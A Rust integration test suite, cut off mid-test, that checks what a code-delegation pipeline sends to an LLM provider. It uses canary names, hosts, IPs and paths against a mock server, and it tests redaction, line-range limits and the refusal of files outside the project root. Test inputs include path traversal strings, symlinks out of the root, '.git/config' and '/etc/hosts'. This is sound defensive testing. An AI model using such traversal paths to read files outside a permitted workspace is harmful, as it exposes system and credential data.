//! Leak validation: what leaves the machine when middleman delegates, proven against wiremock.
//!
//! A canary project is built in a temp dir: real source files of this repository plus synthetic
//! files, a README, a config, `.git` metadata and symlinks that name a fictional company
//! ("Zephyrine"), product ("QuasarLedger"), user ("mkaraca"), internal hosts, emails, IPs and
//! home paths. Requests run through the real pipeline; every byte wiremock receives is checked.
//!
//! Tests marked `// LEAK:` document a current leak; each has an `#[ignore]` twin that must pass
//! once the leak is fixed (`cargo test --test leak_validation -- --ignored`).
//!
//! No test here talks to a real provider. See docs/LEAK-VALIDATION.md for the results.

#![cfg(unix)]

mod common;

use std::collections::BTreeSet;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};

use common::{models_body, Echo, FAKE_KEY};
use middleman::classify::Declared;
use middleman::config::Config;
use middleman::economics::WriteMode;
use middleman::intake::FileRef;
use middleman::pipeline::{DelegateOutcome, DelegateRequest, InputText, Pipeline, Status};
use middleman::TaskKind;
use serde_json::{json, Value};
use tempfile::TempDir;
use wiremock::matchers::{method, path};
use wiremock::{Mock, MockServer, ResponseTemplate};

// ---------------------------------------------------------------------------------------------
// canaries
// ---------------------------------------------------------------------------------------------

const COMPANY: &str = "Zephyrine";
const PRODUCT: &str = "QuasarLedger";
const USERNAME: &str = "mkaraca";

/// What the user is told to put in the dictionary: the names, nothing else.
const DICT: &[&str] = &[COMPANY, PRODUCT, USERNAME, "Karaca"];

/// Must never appear in anything sent, compared on a skeleton (case folded incl. Turkish
/// dotted / dotless i, every non-alphanumeric character removed). Covers every case variant
/// and every split form (`quasar_ledger`, `Quasar Ledger`, `QUASAR-LEDGER`).
const SKELETON_CANARIES: &[&str] = &["zephyrine", "quasarledger", "mkaraca", "karaca", "zphr"];

/// Must never appear verbatim (compared case-insensitively on the raw bytes).
const LITERAL_CANARIES: &[&str] = &[
    "billing.zephyrine-corp.io",
    "ledger-db-01.prod.zphr.internal",
    "grafana.zphr.lan",
    "git.zephyrine.dev",
    "mehmet.karaca@zephyrine.io",
    "ops@zphr-mail.com",
    "zphr-mail.com",
    "10.42.7.19",
    "172.16.99.3",
    "192.168.50.12",
    "fd12:3456:789a::42",
    "/Users/mkaraca",
    "/home/mkaraca",
    // only in files that are never requested
    "README_ONLY_CANARY_7731",
    "NEIGHBOUR_ONLY_CANARY_4410",
    "GITCONFIG_ONLY_CANARY_9902",
    "GITMODULES_ONLY_CANARY_3358",
    "OUTSIDE_ROOT_CANARY_6617",
    "APPTOML_ONLY_CANARY_2046",
    // outside the requested line range of src/tenant.rs
    "ABOVE_RANGE_CANARY_1188",
    "BELOW_RANGE_CANARY_5529",
];

/// Synthetic, canary-dense Rust file. Lines `TENANT_FROM..=TENANT_TO` are what gets requested.
const TENANT_RS: &str = r#"//! Tenant service. ABOVE_RANGE_CANARY_1188
// settle_interbank_netting is the crown-jewel algorithm; it is above the requested range.
fn settle_interbank_netting_above() {}

//! Zephyrine QuasarLedger tenant service (owner: mkaraca, Mehmet Karaca).
// contact: mehmet.karaca@zephyrine.io or ops@zphr-mail.com
use std::time::Duration;

pub const ZEPHYRINE_API: &str = "https://billing.zephyrine-corp.io:8443/v2/charges";
pub const QUASARLEDGER_DB: &str = "postgres://ledger_rw@ledger-db-01.prod.zphr.internal:5432/ledger";
pub const GRAFANA_HOST: &str = "grafana.zphr.lan";
pub const GIT_REMOTE: &str = "https://git.zephyrine.dev/platform/quasarledger.git";
pub const FALLBACK_IP: &str = "10.42.7.19";
pub const NAT_IP: &str = "172.16.99.3";
pub const LAN_IP: &str = "192.168.50.12";
pub const ULA_V6: &str = "fd12:3456:789a::42";
pub const DATA_DIR: &str = "/Users/mkaraca/work/zephyrine/quasarledger/data";
pub const CI_HOME: &str = "/home/mkaraca/.cache/quasarledger";
pub const OWNER: &str = "mkaraca";

/// Case variants: ZEPHYRINE zephyrine zEpHyRiNe ZEPHYRİNE zephyrıne Zephyrıne
/// and: QUASARLEDGER quasarledger quasarLedger Quasarledger QUASARLEDGER_TIMEOUT_S
pub struct ZephyrineClient {
    pub zephyrine_tenant_id: u64,
    pub quasarledger_region: String,
}

impl ZephyrineClient {
    pub fn get_quasarledger_timeout(&self) -> Duration {
        Duration::from_secs(30)
    }
    pub fn zephyrineBaseUrl(&self) -> &'static str {
        ZEPHYRINE_API
    }
}
// end of requested range

// BELOW_RANGE_CANARY_5529
fn settle_interbank_netting_below() {}
"#;
const TENANT_FROM: usize = 5;
const TENANT_TO: usize = 37;

/// Split / separator forms of the dictionary terms. Not rewritable; the pipeline must block.
const SPLIT_FORMS_RS: &str = r#"pub const A: &str = "quasar_ledger";
pub const B: &str = "QUASAR_LEDGER";
pub const C: &str = "quasar-ledger";
pub const D: &str = "Quasar Ledger";
pub const E: &str = "Z e p h y r i n e";
"#;

const README_MD: &str = r#"# QuasarLedger by Zephyrine
README_ONLY_CANARY_7731
Maintainer: Mehmet Karaca <mehmet.karaca@zephyrine.io> (mkaraca)
Staging: https://billing.zephyrine-corp.io  DB: ledger-db-01.prod.zphr.internal (10.42.7.19)
Checkout: /Users/mkaraca/work/zephyrine/quasarledger
"#;

const APP_TOML: &str = r#"# APPTOML_ONLY_CANARY_2046
company = "Zephyrine"
product = "QuasarLedger"
db_host = "ledger-db-01.prod.zphr.internal"
"#;

const GIT_CONFIG: &str = r#"[remote "origin"]
	url = git@git.zephyrine.dev:platform/quasarledger.git
	# GITCONFIG_ONLY_CANARY_9902
[user]
	name = Mehmet Karaca
	email = mehmet.karaca@zephyrine.io
"#;

const GITMODULES: &str = r#"[submodule "vendor/sub"]
	path = vendor/sub
	url = git@git.zephyrine.dev:platform/shared-protos.git
	# GITMODULES_ONLY_CANARY_3358
"#;

// ---------------------------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------------------------

fn repo_file(rel: &str) -> String {
    std::fs::read_to_string(Path::new(env!("CARGO_MANIFEST_DIR")).join(rel)).unwrap()
}

/// Case fold (ASCII + Turkish i variants), keep letters and digits only.
fn skeleton(s: &str) -> String {
    s.chars()
        .filter(|c| *c != '\u{307}')
        .flat_map(|c| match c {
            'İ' | 'ı' | 'I' => vec!['i'],
            c => c.to_lowercase().collect::<Vec<_>>(),
        })
        .filter(|c| c.is_alphanumeric())
        .collect()
}

/// Every canary found in `text` (empty = clean).
fn canaries_in(text: &str) -> Vec<String> {
    let mut hits = Vec::new();
    let lower = text.to_lowercase();
    for c in LITERAL_CANARIES {
        if lower.contains(&c.to_lowercase()) {
            hits.push(format!("literal:{c}"));
        }
    }
    // line by line, so the check cannot be fooled (or tripped) by joins across lines
    for line in text.lines() {
        let sk = skeleton(line);
        for c in SKELETON_CANARIES {
            if sk.contains(c) {
                hits.push(format!("skeleton:{c} in `{}`", line.trim()));
            }
        }
    }
    hits
}

/// All string leaves of a JSON value, unescaped.
fn strings_of(v: &Value, out: &mut Vec<String>) {
    match v {
        Value::String(s) => out.push(s.clone()),
        Value::Array(a) => a.iter().for_each(|x| strings_of(x, out)),
        Value::Object(o) => o.iter().for_each(|(k, x)| {
            out.push(k.clone());
            strings_of(x, out)
        }),
        _ => {}
    }
}

/// Canaries anywhere in one captured HTTP request: URL, header names and values, raw body and
/// every decoded JSON string in the body.
fn canaries_in_request(r: &wiremock::Request) -> Vec<String> {
    let mut hits = canaries_in(r.url.as_str());
    for (k, v) in r.headers.iter() {
        hits.extend(canaries_in(k.as_str()));
        hits.extend(canaries_in(&String::from_utf8_lossy(v.as_bytes())));
    }
    let raw = String::from_utf8_lossy(&r.body).to_string();
    hits.extend(canaries_in(&raw));
    if let Ok(v) = serde_json::from_slice::<Value>(&r.body) {
        let mut s = Vec::new();
        strings_of(&v, &mut s);
        for x in s {
            hits.extend(canaries_in(&x));
        }
    }
    hits
}

/// (system, user) of a captured completion request in either wire format.
fn prompt_of(r: &wiremock::Request) -> (String, String) {
    let v: Value = serde_json::from_slice(&r.body).unwrap();
    let msgs = v["messages"].as_array().unwrap();
    let user = msgs
        .iter()
        .find(|m| m["role"] == "user")
        .and_then(|m| m["content"].as_str())
        .unwrap()
        .to_string();
    let system = v["system"]
        .as_str()
        .map(String::from)
        .or_else(|| {
            msgs.iter()
                .find(|m| m["role"] == "system")
                .and_then(|m| m["content"].as_str())
                .map(String::from)
        })
        .unwrap_or_default();
    (system, user)
}

struct Proj {
    dir: TempDir,
    root: PathBuf,
    cfg_path: PathBuf,
    outside: PathBuf,
}

impl Proj {
    fn pipeline(&self) -> Pipeline {
        Pipeline::new(Config::load(&self.cfg_path).unwrap()).unwrap()
    }
    fn state(&self) -> PathBuf {
        self.dir.path().join("state")
    }
}

fn write(root: &Path, rel: &str, text: &str) {
    let p = root.join(rel);
    std::fs::create_dir_all(p.parent().unwrap()).unwrap();
    std::fs::write(p, text).unwrap();
}

/// The canary project. Its root directory is itself named after the company and product:
/// `<tmp>/zephyrine-corp/quasarledger`.
fn project(base_url: &str, api: &str, dict: &[&str], extra: &str, provider_extra: &str) -> Proj {
    let dir = tempfile::tempdir().unwrap();
    project_in(dir, base_url, api, dict, extra, provider_extra)
}

/// A temp dir with a fixed, word-like name. Used where the absolute root path itself is put
/// into a payload: a random directory name can look like a high-entropy token, which blocks
/// the request (fail closed) and would make those tests depend on luck.
fn fixed_dir(name: &str) -> TempDir {
    let base = std::env::temp_dir();
    let _ = std::fs::remove_dir_all(base.join(name));
    tempfile::Builder::new()
        .prefix(name)
        .rand_bytes(0)
        .tempdir_in(base)
        .unwrap()
}

async fn setup_fixed(name: &str) -> (MockServer, Proj, Pipeline) {
    let s = server().await;
    let p = project_in(
        fixed_dir(name),
        &format!("{}/v1", s.uri()),
        "openai",
        DICT,
        "",
        "",
    );
    let pl = p.pipeline();
    (s, p, pl)
}

fn project_in(
    dir: TempDir,
    base_url: &str,
    api: &str,
    dict: &[&str],
    extra: &str,
    provider_extra: &str,
) -> Proj {
    let root = dir.path().join("zephyrine-corp").join("quasarledger");
    std::fs::create_dir_all(&root).unwrap();
    let root = std::fs::canonicalize(root).unwrap();

    // a realistic slice of this repository's own source
    write(&root, "src/pipeline.rs", &repo_file("src/pipeline.rs"));
    write(&root, "src/config.rs", &repo_file("src/config.rs"));
    write(&root, "src/egress.rs", &repo_file("src/egress.rs"));
    // synthetic files
    write(&root, "src/tenant.rs", TENANT_RS);
    write(&root, "src/split_forms.rs", SPLIT_FORMS_RS);
    write(
        &root,
        "src/neighbour.rs",
        "// NEIGHBOUR_ONLY_CANARY_4410\npub fn neighbour() {}\n",
    );
    write(
        &root,
        "src/includes.rs",
        "mod neighbour;\nconst R: &str = include_str!(\"../README.md\");\npub fn f() -> usize { R.len() }\n",
    );
    write(
        &root,
        "zephyrine/billing.rs",
        "pub fn charge() -> u32 { 1 }\n",
    );
    write(
        &root,
        "internal-fraud-engine/risk_scoring_v3.rs",
        "pub fn score() -> u32 { 7 }\n",
    );
    for i in 0..8 {
        write(&root, &format!("many/f{i}.rs"), "pub fn f() {}\n");
    }
    write(&root, "README.md", README_MD);
    write(&root, "config/app.toml", APP_TOML);
    write(&root, ".git/config", GIT_CONFIG);
    write(
        &root,
        ".git/HEAD",
        "ref: refs/heads/zephyrine-secret-launch\n",
    );
    write(&root, ".gitmodules", GITMODULES);
    write(
        &root,
        "vendor/sub/.git",
        "gitdir: ../../.git/modules/vendor/sub\n",
    );
    write(&root, "vendor/sub/lib.rs", "pub fn sub() {}\n");

    // outside the root, reachable only through symlinks
    let outside = dir.path().join("outside-secret.rs");
    std::fs::write(&outside, "// OUTSIDE_ROOT_CANARY_6617\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::symlink;
        symlink(&outside, root.join("src/link_out.rs")).unwrap();
        symlink(root.join(".git/config"), root.join("src/link_git.rs")).unwrap();
        symlink(dir.path(), root.join("linkdir")).unwrap();
    }

    let dict_path = dir.path().join("dictionary.txt");
    std::fs::write(&dict_path, dict.join("\n") + "\n").unwrap();
    let key_file = dir.path().join("keys.env");
    std::fs::write(&key_file, format!("MM_TEST_KEY_NOT_IN_ENV={FAKE_KEY}\n")).unwrap();
    let text = format!(
        r#"
state_dir = "{state}"
cache_dir = "{cache}"

[paths]
roots = ["{root}"]

[economics]
enforce_break_even = false

[redact]
dictionary_file = "{dict}"

[budget]
per_call_usd = 0.05
daily_usd = 5.0
weekly_usd = 20.0
reserve_usd = 1.0

{extra}

[providers.mock]
api = "{api}"
base_url = "{base_url}"
key_env = "MM_TEST_KEY_NOT_IN_ENV"
key_file = "{key_file}"
balance = "yzlab"
max_sensitivity = "S2"
{provider_extra}
"#,
        state = dir.path().join("state").display(),
        cache = dir.path().join("cache").display(),
        root = root.display(),
        dict = dict_path.display(),
        key_file = key_file.display(),
    );
    let cfg_path = dir.path().join("config.toml");
    std::fs::write(&cfg_path, text).unwrap();
    Proj {
        dir,
        root,
        cfg_path,
        outside,
    }
}

const MODELS: &[(&str, f64, f64)] = &[("qwen-mini", 0.1, 0.2), ("qwen-max", 1.0, 2.0)];

async fn server() -> MockServer {
    let s = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/v1/models"))
        .respond_with(ResponseTemplate::new(200).set_body_json(models_body(MODELS)))
        .mount(&s)
        .await;
    Mock::given(method("GET"))
        .and(path("/v1/balance"))
        .respond_with(
            ResponseTemplate::new(200)
                .set_body_json(json!({"balance_usd": 100.0, "payg_enabled": false})),
        )
        .mount(&s)
        .await;
    Mock::given(method("POST"))
        .respond_with(Echo)
        .mount(&s)
        .await;
    s
}

async fn setup(api: &str) -> (MockServer, Proj, Pipeline) {
    setup_with(api, DICT, "", "").await
}

async fn setup_with(
    api: &str,
    dict: &[&str],
    extra: &str,
    provider_extra: &str,
) -> (MockServer, Proj, Pipeline) {
    let s = server().await;
    let p = project(&format!("{}/v1", s.uri()), api, dict, extra, provider_extra);
    let pl = p.pipeline();
    (s, p, pl)
}

async fn all_requests(s: &MockServer) -> Vec<wiremock::Request> {
    s.received_requests().await.unwrap()
}

async fn posts(s: &MockServer) -> Vec<wiremock::Request> {
    all_requests(s)
        .await
        .into_iter()
        .filter(|r| r.method.as_str() == "POST")
        .collect()
}

fn file(path: &str, range: Option<(usize, usize)>) -> FileRef {
    FileRef {
        path: path.into(),
        start_line: range.map(|r| r.0),
        end_line: range.map(|r| r.1),
    }
}

fn request(kind: TaskKind, instructions: &str, files: Vec<FileRef>) -> DelegateRequest {
    let mut r = DelegateRequest::simple(kind, instructions, Declared::Internal);
    r.files = files;
    r.write_mode = Some(WriteMode::Inline);
    r
}

/// The canary request: canary names in the instructions, in a pasted input and its label, a
/// line range of the canary-dense file, and a line range of real source.
fn canary_request(kind: TaskKind) -> DelegateRequest {
    let mut r = request(
        kind,
        "Document the Zephyrine QuasarLedger tenant client (ask mkaraca, mehmet.karaca@zephyrine.io). \
         It lives in /Users/mkaraca/work/zephyrine/quasarledger and talks to ledger-db-01.prod.zphr.internal.",
        vec![
            file("src/tenant.rs", Some((TENANT_FROM, TENANT_TO))),
            file("src/pipeline.rs", Some((57, 128))),
        ],
    );
    r.inputs = vec![InputText {
        label: "notes from the QuasarLedger wiki (zephyrine)".into(),
        text: "ZEPHYRINE runs quasarledger on 10.42.7.19; owner Karaca.".into(),
    }];
    r
}

fn lines(text: &str, from: usize, to: usize) -> String {
    text.split_inclusive('\n')
        .skip(from - 1)
        .take(to + 1 - from)
        .collect()
}

fn assert_ok(out: &DelegateOutcome) {
    assert_eq!(
        out.status,
        Status::Ok,
        "{:?} {:?}",
        out.block_reason,
        out.error
    );
}

// ---------------------------------------------------------------------------------------------
// probe (prints what is sent; run with --ignored --nocapture)
// ---------------------------------------------------------------------------------------------

#[tokio::test]
#[ignore = "diagnostic: prints the sanitized payload of the canary request"]
async fn probe_print_canary_payload() {
    let (s, _p, pl) = setup("openai").await;
    let out = pl.run(canary_request(TaskKind::Docstring)).await;
    println!("status={:?} block={:?}", out.status, out.block_reason);
    println!(
        "redactions={:?} warnings={:?}",
        out.redactions, out.warnings
    );
    for r in all_requests(&s).await {
        println!("== {} {}", r.method, r.url);
        for (k, v) in r.headers.iter() {
            let v = String::from_utf8_lossy(v.as_bytes()).replace(FAKE_KEY, "<key>");
            println!("   {k}: {v}");
        }
        if r.method.as_str() == "POST" {
            let (sys, user) = prompt_of(&r);
            println!("-- system\n{sys}\n-- user\n{user}");
            println!("-- canaries: {:?}", canaries_in_request(&r));
        }
    }
}

// ---------------------------------------------------------------------------------------------
// 1. canary test on real code
// ---------------------------------------------------------------------------------------------

/// The detector used by every assertion below really finds the canaries.
#[test]
fn control_canary_detector_finds_the_canaries() {
    assert!(canaries_in(TENANT_RS).len() > 40);
    for v in [
        "ZEPHYRINE",
        "zEpHyRiNe",
        "ZEPHYRİNE",
        "zephyrıne",
        "quasar_ledger",
        "QUASAR-LEDGER",
        "Quasar Ledger",
        "quasarLedger",
        "x_mkaraca_y",
        "10.42.7.19",
        "/Users/mkaraca/x",
    ] {
        assert!(!canaries_in(v).is_empty(), "{v}");
    }
    assert!(canaries_in("pub struct LifoseraClient; // svc1.example.net 198.51.100.1").is_empty());
}

/// PASS: every task kind x both wire formats; no canary in any URL, header or body of any
/// request (model list, balance and completion calls).
#[tokio::test]
async fn canary_never_leaves_for_any_task_kind_in_both_wire_formats() {
    for (api, endpoint) in [
        ("openai", "/v1/chat/completions"),
        ("anthropic", "/v1/messages"),
    ] {
        let (s, _p, pl) = setup(api).await;
        for kind in TaskKind::ALL {
            let out = pl.run(canary_request(kind)).await;
            assert_ok(&out);
            assert!(out.redactions["dictionary"] >= 30, "{:?}", out.redactions);
            for cat in ["email", "host", "url_host", "ipv4", "ipv6", "path"] {
                assert!(out.redactions.contains_key(cat), "{api} {kind}: {cat}");
            }
            // the caller (Claude, trusted) gets the originals back
            assert!(out.output.unwrap().contains("ZephyrineClient"));
        }
        let sent = posts(&s).await;
        assert_eq!(sent.len(), TaskKind::ALL.len(), "{api}");
        for r in all_requests(&s).await {
            let hits = canaries_in_request(&r);
            assert!(hits.is_empty(), "{api} {} {}: {hits:?}", r.method, r.url);
        }
        for r in &sent {
            assert_eq!(r.url.path(), endpoint);
            let (_, user) = prompt_of(r);
            // surrogates, not blanks: the provider sees a coherent program
            assert!(user.contains("example.net") && user.contains("198.51.100."));
            assert!(user.contains("/home/user1/work/"));
        }
    }
}

/// RISK (by design): the dictionary is the only thing that hides names. Same request, the
/// names missing from the dictionary: hosts, emails, IPs and home paths are still replaced,
/// the company and product names are sent verbatim.
#[tokio::test]
async fn control_names_missing_from_the_dictionary_are_sent_verbatim() {
    let (s, _p, pl) = setup_with("openai", &["Unrelatedterm"], "", "").await;
    assert_ok(&pl.run(canary_request(TaskKind::Docstring)).await);
    let (_, user) = prompt_of(&posts(&s).await[0]);
    assert!(user.contains("pub struct ZephyrineClient") && user.contains("QuasarLedger"));
    assert!(user.contains("OWNER: &str = \"mkaraca\""));
    for still_hidden in [
        "billing.zephyrine-corp.io",
        "ledger-db-01.prod.zphr.internal",
        "mehmet.karaca@zephyrine.io",
        "10.42.7.19",
        "/Users/mkaraca",
    ] {
        assert!(!user.contains(still_hidden), "{still_hidden}");
    }
}

/// PASS: separator / spaced forms of a dictionary term cannot be rewritten reliably; the
/// request is refused before any network call.
#[tokio::test]
async fn split_and_spaced_forms_block_with_zero_requests() {
    let (s, _p, pl) = setup("openai").await;
    for i in 1..=SPLIT_FORMS_RS.lines().count() {
        let out = pl
            .run(request(
                TaskKind::Docstring,
                "Add docs.",
                vec![file("src/split_forms.rs", Some((i, i)))],
            ))
            .await;
        assert_eq!(out.status, Status::Blocked, "line {i}");
        let reason = out.block_reason.unwrap();
        assert!(reason.contains("dictionary_evasion"), "{reason}");
        assert!(canaries_in(&reason).is_empty(), "{reason}");
    }
    assert!(posts(&s).await.is_empty());
}

/// PASS: the system prompt is a constant; nothing in any request names this machine, the
/// user, the working directory, the project root or the git remote.
#[tokio::test]
async fn nothing_about_the_machine_user_cwd_or_git_remote_is_sent() {
    let (s, p, pl) = setup_fixed("mmleak-root-a").await;
    let root = p.root.to_string_lossy().to_string();
    let mut r = canary_request(TaskKind::Docstring);
    r.instructions = format!("The checkout is at {root}/src and {root} today. Document it.");
    assert_ok(&pl.run(r).await);

    let mut needles: Vec<String> = vec![
        root.clone(),
        p.dir.path().to_string_lossy().to_string(),
        env!("CARGO_MANIFEST_DIR").to_string(),
        "zephyrine-corp".into(),
    ];
    if let Ok(cwd) = std::env::current_dir() {
        needles.push(cwd.to_string_lossy().to_string());
    }
    if let Ok(home) = std::env::var("HOME") {
        needles.push(home);
    }
    let cmd = |prog: &str, args: &[&str]| {
        std::process::Command::new(prog)
            .args(args)
            .current_dir(env!("CARGO_MANIFEST_DIR"))
            .output()
            .ok()
            .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
            .filter(|s| s.len() >= 4)
    };
    needles.extend(cmd("hostname", &[]));
    needles.extend(cmd("git", &["config", "--get", "remote.origin.url"]));
    needles.extend(cmd("git", &["config", "--get", "user.email"]));
    needles.extend(cmd("git", &["config", "--get", "user.name"]));
    let os_user = std::env::var("USER").ok().filter(|u| u.len() >= 4);

    for req in all_requests(&s).await {
        let mut hay = format!("{}\n", req.url);
        for (k, v) in req.headers.iter() {
            hay.push_str(&format!("{k}: {}\n", String::from_utf8_lossy(v.as_bytes())));
        }
        let mut strs = Vec::new();
        if let Ok(v) = serde_json::from_slice::<Value>(&req.body) {
            strs.push(String::from_utf8_lossy(&req.body).to_string());
            strings_of(&v, &mut strs);
        }
        hay.push_str(&strs.join("\n"));
        for n in &needles {
            assert!(!hay.contains(n.as_str()), "machine identifier sent: {n}");
        }
        if let Some(u) = &os_user {
            let word = hay
                .split(|c: char| !(c.is_alphanumeric() || c == '_'))
                .any(|w| w == u);
            assert!(!word, "OS user name sent");
            assert!(!hay.contains(&format!("/Users/{u}")) && !hay.contains(&format!("/home/{u}")));
        }
    }
    let (system, user) = prompt_of(&posts(&s).await[0]);
    assert_eq!(system, middleman::pipeline::SYSTEM_PROMPT);
    // the project root is replaced by a neutral path
    assert!(
        user.contains("The checkout is at /workspace/app/src and /workspace/app today."),
        "{user}"
    );
}

/// PASS: only the requested files and line ranges are sent. Neighbouring files, README,
/// config, `.git` and files named by `mod` / `include_str!` stay local.
#[tokio::test]
async fn only_requested_files_and_line_ranges_are_sent() {
    let (s, _p, pl) = setup("openai").await;
    let egress = repo_file("src/egress.rs");
    let out = pl
        .run(request(
            TaskKind::Docstring,
            "Add docs.",
            vec![
                file("src/egress.rs", Some((18, 52))),
                file("src/includes.rs", None),
                file("src/tenant.rs", Some((TENANT_FROM, TENANT_TO))),
            ],
        ))
        .await;
    assert_ok(&out);
    let sent = posts(&s).await;
    assert_eq!(sent.len(), 1);
    assert!(canaries_in_request(&sent[0]).is_empty());
    let (_, user) = prompt_of(&sent[0]);
    let headers: Vec<&str> = user.lines().filter(|l| l.starts_with("--- ")).collect();
    assert_eq!(
        headers,
        vec![
            "--- FILE src/egress.rs (from line 18) ---",
            "--- FILE src/includes.rs (from line 1) ---",
            "--- FILE src/tenant.rs (from line 5) ---",
            "--- END ---",
        ]
    );
    // the slice is byte-exact and nothing around it came along
    let slice = lines(&egress, 18, 52);
    let start = user
        .find("--- FILE src/egress.rs (from line 18) ---\n")
        .unwrap()
        + "--- FILE src/egress.rs (from line 18) ---\n".len();
    let end = user.find("\n\n--- FILE src/includes.rs").unwrap();
    assert_eq!(&user[start..end], slice);
    assert!(!user.contains("use crate::pseudo::Vault;")); // line 16
    assert!(!user.contains("pub fn seal(")); // line 54
    assert!(user.contains("include_str!(\"../README.md\")")); // the reference, not the content
    assert!(!user.contains("pub fn neighbour"));
    assert!(!user.contains("settle_interbank_netting"));
}

/// PASS + measurement: fraction of a file that leaves when a line range is requested.
#[tokio::test]
async fn line_range_minimization_is_measured() {
    let (s, _p, pl) = setup("openai").await;
    let src = repo_file("src/pipeline.rs");
    let out = pl
        .run(request(
            TaskKind::Docstring,
            "Add docs.",
            vec![file("src/pipeline.rs", Some((57, 128)))],
        ))
        .await;
    assert_ok(&out);
    let (_, user) = prompt_of(&posts(&s).await[0]);
    let slice = lines(&src, 57, 128);
    assert!(user.contains(&slice));
    let envelope = user.len() - slice.len();
    let fraction = slice.len() as f64 / src.len() as f64;
    println!(
        "MEASURE range 57-128 of src/pipeline.rs: {} of {} bytes sent = {:.1}% ({} of {} lines); envelope {} bytes",
        slice.len(),
        src.len(),
        fraction * 100.0,
        128 - 57 + 1,
        src.lines().count(),
        envelope
    );
    assert!(fraction < 0.10, "{fraction}");
    assert!(envelope < 200, "{envelope}");
}

// ---------------------------------------------------------------------------------------------
// 1b. file names
// ---------------------------------------------------------------------------------------------

/// PASS: a dictionary term in a relative path is replaced in the `--- FILE` header.
#[tokio::test]
async fn company_name_in_a_relative_path_is_pseudonymized() {
    let (s, _p, pl) = setup("openai").await;
    let out = pl
        .run(request(
            TaskKind::Docstring,
            "Add docs.",
            vec![file("zephyrine/billing.rs", None)],
        ))
        .await;
    assert_ok(&out);
    let sent = posts(&s).await;
    assert!(canaries_in_request(&sent[0]).is_empty());
    let (_, user) = prompt_of(&sent[0]);
    let header = user.lines().find(|l| l.starts_with("--- FILE")).unwrap();
    assert!(
        header.ends_with("/billing.rs (from line 1) ---"),
        "{header}"
    );
}

/// PASS: an absolute path is sent root-relative; the root (`.../zephyrine-corp/quasarledger`)
/// and everything above it never leaves.
#[tokio::test]
async fn absolute_path_is_sent_root_relative() {
    let (s, p, pl) = setup("openai").await;
    let abs = p.root.join("src/egress.rs").to_string_lossy().to_string();
    assert!(abs.contains("zephyrine-corp/quasarledger"));
    assert_ok(
        &pl.run(request(
            TaskKind::Docstring,
            "Add docs.",
            vec![file(&abs, Some((18, 30)))],
        ))
        .await,
    );
    let sent = posts(&s).await;
    assert!(canaries_in_request(&sent[0]).is_empty());
    let (_, user) = prompt_of(&sent[0]);
    assert!(user.contains("--- FILE src/egress.rs (from line 18) ---"));
    assert!(!user.contains("/private/") && !user.contains("/var/") && !user.contains("/tmp"));
}

// LEAK: directory and file names that are not dictionary terms are sent verbatim in the
// `--- FILE <path> ---` header. Project layout and module names are visible to the provider.
#[tokio::test]
async fn leak_non_dictionary_path_components_are_sent_verbatim() {
    let (s, _p, pl) = setup("openai").await;
    assert_ok(
        &pl.run(request(
            TaskKind::Docstring,
            "Add docs.",
            vec![file("internal-fraud-engine/risk_scoring_v3.rs", None)],
        ))
        .await,
    );
    let (_, user) = prompt_of(&posts(&s).await[0]);
    assert!(user.contains("--- FILE internal-fraud-engine/risk_scoring_v3.rs (from line 1) ---"));
}

#[tokio::test]
#[ignore = "LEAK (open): path components are not pseudonymized; passes once they are"]
async fn fixed_path_components_are_pseudonymized() {
    let (s, _p, pl) = setup("openai").await;
    assert_ok(
        &pl.run(request(
            TaskKind::Docstring,
            "Add docs.",
            vec![file("internal-fraud-engine/risk_scoring_v3.rs", None)],
        ))
        .await,
    );
    let (_, user) = prompt_of(&posts(&s).await[0]);
    assert!(!user.contains("internal-fraud-engine") && !user.contains("risk_scoring_v3"));
    assert!(user.contains(".rs (from line 1) ---")); // the extension is useful and harmless
}

// ---------------------------------------------------------------------------------------------
// 2. source-code minimization and intake limits
// ---------------------------------------------------------------------------------------------

/// PASS: `max_files` (default 6) and `max_input_chars` (default 24 000) hold; an oversized
/// request sends nothing at all (no truncation, no partial send).
#[tokio::test]
async fn max_files_and_max_input_chars_hold() {
    let (s, _p, pl) = setup("openai").await;
    let many = |n: usize| {
        (0..n)
            .map(|i| file(&format!("many/f{i}.rs"), None))
            .collect()
    };
    let out = pl
        .run(request(TaskKind::Docstring, "Add docs.", many(7)))
        .await;
    assert_eq!(out.status, Status::Blocked);
    assert!(out.block_reason.unwrap().contains("too many files"));
    for whole in ["src/pipeline.rs", "src/config.rs"] {
        assert!(repo_file(whole).chars().count() > 24_000);
        let out = pl
            .run(request(
                TaskKind::Docstring,
                "Add docs.",
                vec![file(whole, None)],
            ))
            .await;
        assert_eq!(out.status, Status::Blocked, "{whole}");
        assert!(out.block_reason.unwrap().contains("payload too large"));
    }
    assert!(posts(&s).await.is_empty());

    assert_ok(
        &pl.run(request(TaskKind::Docstring, "Add docs.", many(6)))
            .await,
    );
    let sent = posts(&s).await;
    assert_eq!(sent.len(), 1);
    let (_, user) = prompt_of(&sent[0]);
    assert_eq!(user.matches("--- FILE ").count(), 6);
}

/// PASS: a lowered `max_input_chars` is enforced on the whole payload (instructions, headers
/// and content together).
#[tokio::test]
async fn lowered_max_input_chars_is_enforced_on_the_whole_payload() {
    let (s, _p, pl) = setup_with("openai", DICT, "[limits]\nmax_input_chars = 2000\n", "").await;
    let over = pl
        .run(request(
            TaskKind::Docstring,
            "Add docs.",
            vec![file("src/egress.rs", Some((1, 110)))],
        ))
        .await;
    assert_eq!(over.status, Status::Blocked);
    assert!(posts(&s).await.is_empty());
    assert_ok(
        &pl.run(request(
            TaskKind::Docstring,
            "Add docs.",
            vec![file("src/egress.rs", Some((18, 52)))],
        ))
        .await,
    );
    let sent = posts(&s).await;
    assert_eq!(sent.len(), 1);
    let (_, user) = prompt_of(&sent[0]);
    assert!(user.chars().count() <= 2000);
}

/// PASS: symlinks out of the root, a directory symlink, `..`, an absolute path outside the
/// root, a symlink onto `.git/config` and `.git/*` itself are all refused with zero requests.
#[tokio::test]
async fn symlinks_parent_paths_and_dot_git_cannot_be_pulled_in() {
    let (s, p, pl) = setup("openai").await;
    let outside_abs = p.outside.to_string_lossy().to_string();
    for f in [
        "src/link_out.rs",
        "src/link_git.rs",
        "linkdir/outside-secret.rs",
        "../outside-secret.rs",
        "src/../../outside-secret.rs",
        outside_abs.as_str(),
        ".git/config",
        ".git/HEAD",
        "/etc/hosts",
    ] {
        let out = pl
            .run(request(
                TaskKind::Docstring,
